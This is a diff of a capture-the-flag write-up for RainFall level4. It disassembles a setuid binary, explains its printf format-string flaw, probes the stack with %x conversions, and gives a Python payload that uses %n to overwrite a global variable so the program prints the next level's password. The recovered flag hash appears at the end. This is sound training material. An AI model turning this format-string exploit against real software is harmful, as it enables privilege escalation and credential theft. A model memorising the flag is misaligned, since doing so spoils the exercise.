@@ -9,111 +9,103 @@
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
 
-level4@RainFall:~$ ls -l
--rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
-
 level4@RainFall:~$ pwd
 /home/user/level4
+level4@RainFall:~$ ls -l
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+level4@RainFall:~$ ./level4
+jahdlfjkhasldkjfhlajksd
+jahdlfjkhasldkjfhlajksd
+level4@RainFall:~$ objdump -d level4
+...
+08048444 <p>:
+ 8048444:	55                   	push   %ebp
+ 8048445:	89 e5                	mov    %esp,%ebp
+ 8048447:	83 ec 18             	sub    $0x18,%esp
+ 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
+ 804844d:	89 04 24             	mov    %eax,(%esp)
+ 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
+ 8048455:	c9                   	leave
+ 8048456:	c3                   	ret
 
-level4@RainFall:~$ id
-uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)
+08048457 <n>:
+ 8048457:	55                   	push   %ebp
+ 8048458:	89 e5                	mov    %esp,%ebp
+ 804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
+ 8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 8048470:	00
+ 8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 8048477:	89 04 24             	mov    %eax,(%esp)
+ 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
+ 804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 8048485:	89 04 24             	mov    %eax,(%esp)
+ 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
+ 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
+ 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
+ 8048497:	75 0c                	jne    80484a5 <n+0x4e>
+ 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
+ 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
+ 80484a5:	c9                   	leave
+ 80484a6:	c3                   	ret
 
-level4@RainFall:~$ whoami
-level4
+080484a7 <main>:
+ 80484a7:	55                   	push   %ebp
+ 80484a8:	89 e5                	mov    %esp,%ebp
+ 80484aa:	83 e4 f0             	and    $0xfffffff0,%esp
+ 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
+ 80484b2:	c9                   	leave
+ 80484b3:	c3                   	ret
+ 80484b4:	90                   	nop
+ 80484b5:	90                   	nop
+...
+********************************************************************************
+Three functions are defined : main, p, and n.
+We can see that the p function calls printf, which uses the input string readed
+on stdin by fgets as a format. We can also see a comparison between the variable
+m and an arbitrary value : 0x1025544. If this comparison is not true, then we
+jump directly on the leave instruction of n. But if it is true, then we keep
+going through the code until the system call. It would be useful to know what
+kind of command this system call will launch, just to be sure.
+********************************************************************************
+level4@RainFall:~$ strings level4
+...
+/bin/cat /home/user/level5/.pass
+...
+********************************************************************************
+This command is exactly what we need, because it will try to display our flag
+with the right permissions to do so. Now we have to find a way to write the
+arbitrary comparison value (0x1025544) into the m variable.
+The %n printf conversion is able to write the number of bytes written on stdout
+by a printf call in memory. Since we have full control on this input format,
+we can generate a string that will pop all arguments in the stack, and take the
+4 first bytes of format string as an argument. At this moment, we can launch a
+%n conversion to write the len the string into m, as its address is given in
+parameter for the %n conversion.
+********************************************************************************
+level4@RainFall:~$ ./level4
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+********************************************************************************
+We can see that we need to pop 11 elements on the stack to get our format's 4
+first bytes as a parameter. So now we can write the m variable address as the
+four first bytes of our format. We can then adjust the number of bytes written
+by using a padding information into one of our 4 bytes conversion.
+Let's create our payload with python:
+-----------------------------exploit_printf.py----------------------------------
+m_addr = '\x10\x98\x04\x08' # Adresse de la variable m (little-endian).
 
-(gdb) info functions
-All defined functions:
+poppers = '%x' * 10 # Conversions chargees de pop les elements de la stack.
 
-Non-debugging symbols:
-0x080482f8  _init
-0x08048340  printf
-0x08048340  printf@plt
-0x08048350  fgets
-0x08048350  fgets@plt
-0x08048360  system
-0x08048360  system@plt
-0x08048370  __gmon_start__
-0x08048370  __gmon_start__@plt
-0x08048380  __libc_start_main
-0x08048380  __libc_start_main@plt
-0x08048390  _start
-0x080483c0  __do_global_dtors_aux
-0x08048420  frame_dummy
-0x08048444  p
-0x08048457  n
-0x080484a7  main
-0x080484c0  __libc_csu_init
-0x08048530  __libc_csu_fini
-0x08048532  __i686.get_pc_thunk.bx
-0x08048540  __do_global_ctors_aux
-0x0804856c  _fini
+print(m_addr + poppers + '%16930052x' + '%n') # Payload finale
+----------------------------------------------------------------
+To calculate the padding, we sum up the number of bytes printed by the current
+format string, then a substraction gives us the final answer.
+0x01025544 == 16930116
+16930116 - 64 == 16930052
+********************************************************************************
+python /tmp/exploit_printf.py | ./level4
+...
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 
-(gdb) info variable
-All defined variables:
-
-Non-debugging symbols:
-0x08048588  _fp_hw
-0x0804858c  _IO_stdin_used
-0x080486f8  __FRAME_END__
-0x080496fc  __CTOR_LIST__
-0x080496fc  __init_array_end
-0x080496fc  __init_array_start
-0x08049700  __CTOR_END__
-0x08049704  __DTOR_LIST__
-0x08049708  __DTOR_END__
-0x0804970c  __JCR_END__
-0x0804970c  __JCR_LIST__
-0x08049710  _DYNAMIC
-0x080497dc  _GLOBAL_OFFSET_TABLE_
-0x080497fc  __data_start
-0x080497fc  data_start
-0x08049800  __dso_handle
-0x08049804  stdin@@GLIBC_2.0
-0x08049808  completed.6159
-0x0804980c  dtor_idx.6161
-0x08049810  m
-
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080484a7 <+0>:	push   %ebp
-   0x080484a8 <+1>:	mov    %esp,%ebp
-   0x080484aa <+3>:	and    $0xfffffff0,%esp
-   0x080484ad <+6>:	call   0x8048457 <n>
-   0x080484b2 <+11>:	leave
-   0x080484b3 <+12>:	ret
-End of assembler dump.
-
-(gdb) disas p
-Dump of assembler code for function p:
-   0x08048444 <+0>:	push   %ebp
-   0x08048445 <+1>:	mov    %esp,%ebp
-   0x08048447 <+3>:	sub    $0x18,%esp
-   0x0804844a <+6>:	mov    0x8(%ebp),%eax
-   0x0804844d <+9>:	mov    %eax,(%esp)
-   0x08048450 <+12>:	call   0x8048340 <printf@plt>
-   0x08048455 <+17>:	leave
-   0x08048456 <+18>:	ret
-End of assembler dump.
-
-(gdb) disas n
-Dump of assembler code for function n:
-   0x08048457 <+0>:	push   %ebp
-   0x08048458 <+1>:	mov    %esp,%ebp
-   0x0804845a <+3>:	sub    $0x218,%esp
-   0x08048460 <+9>:	mov    0x8049804,%eax
-   0x08048465 <+14>:	mov    %eax,0x8(%esp)
-   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
-   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
-   0x08048477 <+32>:	mov    %eax,(%esp)
-   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
-   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
-   0x08048485 <+46>:	mov    %eax,(%esp)
-   0x08048488 <+49>:	call   0x8048444 <p>
-   0x0804848d <+54>:	mov    0x8049810,%eax
-   0x08048492 <+59>:	cmp    $0x1025544,%eax
-   0x08048497 <+64>:	jne    0x80484a5 <n+78>
-   0x08048499 <+66>:	movl   $0x8048590,(%esp)
-   0x080484a0 <+73>:	call   0x8048360 <system@plt>
-   0x080484a5 <+78>:	leave
-   0x080484a6 <+79>:	ret
-End of assembler dump.
